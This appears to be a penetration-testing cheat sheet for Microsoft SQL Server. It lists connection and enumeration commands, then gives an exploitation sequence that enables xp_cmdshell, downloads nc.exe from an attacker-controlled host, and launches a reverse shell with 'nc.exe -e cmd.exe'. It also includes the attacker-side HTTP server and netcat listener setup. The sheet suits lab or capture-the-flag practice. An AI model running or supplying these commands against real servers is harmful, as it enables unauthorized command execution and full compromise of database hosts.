#database 
## Info
- **Type:** Relational Database Management System (RDBMS)
- **Common Usage:** Enterprise applications, web applications, Windows-based infrastructure
- **Security Note:** MSSQL servers may be vulnerable to **default credentials, weak authentication, XP_CMDSHELL abuse, and privilege escalation attacks**.

## Basic Commands

```bash
# Connect using authentication
mssqlclient.py $USER@$IP -windows-auth

# Connect using SQL authentication
mssqlclient.py $USER:$PASSWORD@$IP
```

```sql
# List databases
SELECT name FROM master.dbo.sysdatabases;

# Select a database
USE $DATABASE;

# List tables in the current database
SELECT * FROM information_schema.tables;

# List all users
SELECT name FROM master.sys.syslogins;

# Get current user
SELECT SYSTEM_USER;

# Checking Permissions
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Exploitation

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;  -- Allow advanced options
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;  -- Enable xp_cmdshell
RECONFIGURE;

-- Test xp_cmdshell
xp_cmdshell "whoami";  -- Check current user
xp_cmdshell "powershell -c pwd";  -- Get current directory

-- Download nc.exe and save to Downloads
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://$HOST/nc.exe -outfile nc.exe";

-- Start reverse shell with nc.exe
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe $HOST $PORT";
```

### Attacker Machine
```bash
# Host a file using Python HTTP server
sudo python3 -m http.server 80
```

```bash
# Start a Netcat listener to receive a shell
sudo nc -lnvp $PORT
```